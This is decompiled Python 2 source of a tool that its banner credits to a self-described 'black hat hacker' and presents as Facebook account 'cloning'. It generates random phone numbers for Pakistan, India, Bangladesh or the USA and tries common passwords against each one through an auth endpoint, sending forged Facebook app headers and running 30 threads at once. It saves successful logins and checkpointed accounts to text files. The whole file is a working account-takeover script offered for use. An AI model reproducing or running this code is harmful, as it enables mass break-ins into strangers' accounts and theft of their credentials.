# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <hekelpro>
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
    os.mkdir('save')
except OSError:
    pass

os.system('rm -rf .txt')
for n in range(2000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
from tqdm import tqdm

def load():
    os.system('clear')
    print banner
    print ''
    with tqdm(total=100, desc='Loading ', bar_format='{l_bar}') as (pbar):
        for i in range(100):
            time.sleep(3)
            pbar.update(1)
            main_menu()


banner = "\n\n\x1b[1;91m\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x8f\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\n\x1b[1;92m\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x83\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x83\xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x83\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x83\n\x1b[1;93m\xe2\x95\x8b\xe2\x95\x8b\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x95\x8b\xe2\x94\x83\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93ONLY BANGLADESHI\n\x1b[1;94m\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x83\xe2\x94\x83\xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8311 DIGIT CLONING \n\x1b[1;95m\xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x83\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\xe2\x94\x83\n\x1b[1;96m\xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\x8b\xe2\x94\x97\xe2\x94\xbb\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b\n\xf0\x9f\x92\x95\xf0\x9f\x8d\x83\xf0\x9f\x8c\xb9\xf0\x9f\x8d\x83\xf0\x9f\x92\x95\n\xf0\x9f\x92\x95.\xe2\x80\xa2\xc2\xb0``\xc2\xb0\xe2\x80\xa2.\xc2\xb8.\xe2\x80\xa2\xc2\xb0``\xc2\xb0\xe2\x80\xa2.\xf0\x9f\x92\x95\n\xc2\xa0\xc2\xa0 (\xc2\xa0\xc2\xa0 \xf0\x9f\x8d\x83 \xf0\x9f\x8c\xb9 \xf0\x9f\x8d\x83\xc2\xa0\xc2\xa0 ) \xf0\x9f\x92\x95\n\xc2\xa0\xf0\x9f\x92\x95`\xe2\x80\xa2.\xc2\xb8\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x97\xc2\xa0\xc2\xa0 \xc2\xb8.\xe2\x80\xa2` \xf0\x9f\x92\x95 \n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\xc2\xb0 \xe2\x80\xa2.\xc2\xb8\xc2\xb8.\xe2\x80\xa2\xc2\xb0 \xf0\x9f\x92\x95\xc2\xa0\xc2\xa0 TRICKER-JAMES.\xe2\x98\x95\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\xf0\x9f\x92\x95\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 JAMES-HACKER \xf0\x9f\x8d\x83\xf0\x9f\x8c\xbb\xf0\x9f\x8d\x83\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\xf0\x9f\x8d\x83\xf0\x9f\x8c\xb9\xf0\x9f\x8d\x83\xf0\x9f\x92\x95\xc2\xa0 .\xf0\x9f\x92\x98\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95.\xe2\x80\xa2\xc2\xb0``\xc2\xb0\xe2\x80\xa2.\xc2\xb8.\xe2\x80\xa2\xc2\xb0``\xc2\xb0\xe2\x80\xa2.\xf0\x9f\x92\x95\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95(\xc2\xa0 \xf0\x9f\x8d\x83 \xf0\x9f\x8c\xb9 \xf0\x9f\x8d\x83\xc2\xa0\xc2\xa0 ) \xf0\x9f\x92\x95\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95`\xe2\x80\xa2.\xc2\xb8\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x97\xc2\xa0\xc2\xa0 \xc2\xb8.\xe2\x80\xa2` \xf0\x9f\x92\x95\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\xc2\xb0 \xe2\x80\xa2.\xc2\xb8\xc2\xb8.\xe2\x80\xa2\xc2\xb0 \xf0\x9f\x92\x95\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\xf0\x9f\x92\x95\n\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0 \xf0\x9f\x92\x95\n\x1b[1;94m---------------------------------------------------\n\x1b[1;91m\xe2\x9e\xa3 HACKING IS NOT CRIME IT\xe2\x80\x99S A GAME AGAINST OF THE SYSTEM \n\x1b[1;92m\xe2\x9e\xa3 BANGLADESH BLACK HAT HACKER\n\x1b[1;93m\xe2\x9e\xa3     AUTHOR : JAMES-HACKER\n\x1b[1;94m\xe2\x9e\xa3       FROM : DHAKA,NARAYANGANJ \n\x1b[1;95m\xe2\x9e\xa3   WHATSAPP : +96598064347\n\x1b[1;96m\xe2\x9e\xa3    WARNING : DON\xe2\x80\x99T USE ILLEGAL WAY\n\x1b[1;97m\xe2\x9e\xa3    WARNING : ONLY EDUCATIONAL PURPOSE \n\x1b[1;91m\xe2\x9e\xa3    WARNING : DON'T COPY MY SCRIPT\n\x1b[1;92m\xe2\x9e\xa3    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME\n\x1b[1;93m\xe2\x9e\xa3    WARNING : USE PROXY INDONESIA FOR CLONING  \n\x1b[1;94m---------------------------------------------------"
idh = []

def main_menu():
    os.system('clear')
    print banner
    print ''
    print ('\x1b[1;32mClone From Random Numbers\x1b[0;97m').center(70)
    print ''
    print '\x1b[1;91m[1] Clone From Pakistan'
    print '\x1b[1;92m[2] Clone From India'
    print '\x1b[1;93m[3] Clone From Bangladesh'
    print '\x1b[1;94m[4] Clone From USA'
    print '[0] Back'
    print ''
    main_menu_select()


def main_menu_select():
    id = []
    cps = []
    oks = []
    select = raw_input('\x1b[1;94mChoose Option >>> ')
    if select == '1':
        os.system('clear')
        print banner
        print ''
        print ('\x1b[1;32mClone From Pakistan\x1b[0;97m').center(70)
        print ''
        try:
            c = raw_input('\x1b[1;93m[+] Code : ')
            if len(c) < 3:
                print '[x] Code Must Be Of 3 Digits'
                raw_input('\x1b[1;91mPress Enter To Try Again ')
                main_menu()
            else:
                k = '0'
                idlist = '.txt'
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

        except IOError:
            print '[x] Ids File Not Found'
            raw_input('\x1b[1;93mPress Enter To Try Again')
            main_menu()

    elif select == '2':
        os.system('clear')
        print banner
        print ''
        print ('\x1b[1;32mClone From India\x1b[0;97m').center(70)
        print ''
        print ('\x1b[1;31mMain Codes : 755 855 935 965 975 995\x1b[0;97m').center(70)
        print ''
        try:
            c = raw_input('\x1b[1;91m[+] Code : ')
            if len(c) < 3:
                print '[x] Code Must Be Of 3 Digits'
                raw_input('\x1b[1;91mPress Enter To Try Again ')
                main_menu()
            else:
                k = '+91'
                idlist = '.txt'
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

        except IOError:
            print '[x] Ids File Not Found'
            raw_input('\x1b[1;93mPress Enter To Try Again')
            main_menu()

    elif select == '3':
        os.system('clear')
        print banner
        print ''
        print ('\x1b[1;32mClone From Bangladesh\x1b[0;97m').center(70)
        print ''
        print ('\x1b[1;31mMain Codes : 191 to 199\x1b[0;97m').center(70)
        print ''
        try:
            c = raw_input('\x1b[1;91m[+] Code : ')
            if len(c) < 3:
                print '[x] Code Must Be Of 3 Digits'
                raw_input('\x1b[1;91mPress Enter To Try Again ')
                main_menu()
            else:
                k = '+880'
                idlist = '.txt'
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

        except IOError:
            print '[x] Ids File Not Found'
            raw_input('\x1b[1;93mPress Enter To Try Again')
            main_menu()

    elif select == '4':
        os.system('clear')
        print banner
        print ''
        print ('\x1b[1;32mClone From USA\x1b[0;97m').center(70)
        print ''
        print ('\x1b[1;31mMain Codes : 786 , 721 , 512 , 514 \x1b[0;97m').center(70)
        print ''
        try:
            c = raw_input('[+] Code : ')
            if len(c) < 3:
                print '[x] Code Must Be Of 3 Digits'
                raw_input('\x1b[1;92mPress Enter To Try Again ')
                main_menu()
            else:
                k = '+1'
                idlist = '.txt'
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

        except IOError:
            print '[x] Ids File Not Found'
            raw_input('\x1b[1;91mPress Enter To Try Again')
            main_menu()

    elif select == '0':
        os.system('\x1b[1;93mpython2 hack.py')
    else:
        print '\x1b[1;92m[x] Please Select a Valid Option'
        main_menu()
    print '\x1b[1;91m[\xe2\x9c\x93] Total Numbers : ' + str(len(id))
    print '\x1b[1;92m[\xe2\x9c\x93] The Process Has Been Started'
    print '\x1b[1;93m[\xe2\x9c\x93] Press CTRL Z To Stop'
    print ''
    print 50 * '-'
    print ''
    print ('\x1b[1;91m\x1b[1;32mCreated By : Mr James\x1b[0;97m').center(70)
    print ''
    print 50 * '-'
    print ''

    def main(arg):
        user = arg
        try:
            pass1 = user
            data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[JAMES-HACKED] \x1b[1;30m' + k + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok_no.txt', 'a')
                ok.write(k + c + user + ' | ' + pass1)
                ok.close()
                oks.append(k + c + user + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[JAMES-CP] ' + k + c + user + ' | ' + pass1
                cp = open('cp_no.txt', 'a')
                cp.write(k + c + user + ' | ' + pass1)
                cp.close()
                cps.append(k + c + user + pass1)
            else:
                pass2 = '786786'
                data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[JAMES-HACKED] \x1b[1;30m' + k + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok_no.txt', 'a')
                    ok.write(k + c + user + ' | ' + pass2)
                    ok.close()
                    oks.append(k + c + user + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[JAMES-CP] ' + k + c + user + ' | ' + pass2
                    cp = open('cp_no.txt', 'a')
                    cp.write(k + c + user + ' | ' + pass2)
                    cp.close()
                    cps.append(k + c + user + pass2)
                else:
                    pass3 = '000786'
                    data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[JAMES-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok_no.txt', 'a')
                        ok.write(k + c + user + ' | ' + pass3)
                        ok.close()
                        oks.append(k + c + user + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[JAMES-CP] ' + k + c + user + ' | ' + pass3
                        cp = open('cp_no.txt', 'a')
                        cp.write(k + c + user + ' | ' + pass3)
                        cp.close()
                        cps.append(k + c + user + pass3)
                    else:
                        pass4 = k + c + user
                        data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[JAMES-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok_no.txt', 'a')
                            ok.write(k + c + user + ' | ' + pass4)
                            ok.close()
                            oks.append(k + c + user + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[JAMES-CP] ' + k + c + user + ' | ' + pass4
                            cp = open('cp_no.txt', 'a')
                            cp.write(k + c + user + ' | ' + pass4)
                            cp.close()
                            cps.append(k + c + user + pass4)
                        else:
                            pass5 = '556676'
                            data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;32m[JAMES-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok_no.txt', 'a')
                                ok.write(k + c + user + ' | ' + pass5)
                                ok.close()
                                oks.append(k + c + user + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '[JAMES-CP] ' + k + c + user + ' | ' + pass5
                                cp = open('cp_no.txt', 'a')
                                cp.write(k + c + user + ' | ' + pass5)
                                cp.close()
                                cps.append(k + c + user + pass5)
                            else:
                                pass6 = 'Pakistan'
                                data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;32m[JAMES-HACKED] \x1b[1;90m' + k + c + user + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok_no.txt', 'a')
                                    ok.write(k + c + user + ' | ' + pass6)
                                    ok.close()
                                    oks.append(k + c + user + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '[JAMES-CP] ' + k + c + user + ' | ' + pass6
                                    cp = open('cp_no.txt', 'a')
                                    cp.write(k + c + user + ' | ' + pass6)
                                    cp.close()
                                    cps.append(k + c + user + pass6)
                                else:
                                    pass7 = '102030'
                                    data = requests.get('http://localhost:5000/auth?id=' + k + c + user + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;32m[JAMES-HACKED] \x1b[1;30m' + k + c + user + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok_no.txt', 'a')
                                        ok.write(k + c + user + ' | ' + pass7)
                                        ok.close()
                                        oks.append(k + c + user + pass7)
                                    if 'www.facebook.com' in q['error']:
                                        print '[JAMES-CP] ' + k + c + user + ' | ' + pass7
                                        cp = open('cp_ok.txt', 'a')
                                        cp.write(k + c + user + pass7)
                                        cp.close()
                                        cps.append(k + c + user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 50 * '-'
    print ''
    print ('\x1b[1;91mThe Process Has Been Completed').center(65)
    print ('\x1b[1;93mTotal Ok / Cp IDs : ' + str(len(oks)) + ' / ' + str(len(cps))).center(57)
    print ''
    print 50 * '-'
    print ''
    raw_input('\x1b[1;91mPress Enter To Back ')
    main_menu()


if __name__ == '__main__':
    load()